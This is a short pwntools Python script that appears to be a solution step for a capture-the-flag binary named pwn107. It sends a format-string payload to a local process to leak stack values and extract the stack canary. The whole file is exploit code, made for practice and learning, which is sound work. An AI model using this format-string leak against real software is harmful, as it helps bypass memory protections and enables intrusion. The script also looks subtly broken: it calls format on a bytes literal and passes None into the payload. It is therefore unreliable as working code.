from pwn import *

elf = context.binary = ELF('./pwn107-1644307530397.pwn107')
context.log_level = 'debug'

p = process()
p.sendlineafter("?", b'%{}$p %{}$p'.format(4, None))
p.recvline()

result = p.recvline().decode()

result = result.split(" ")
print(result)
canary = result[3]

success('Canary found: {}'.format(hex(int(canary.strip(), 16))))
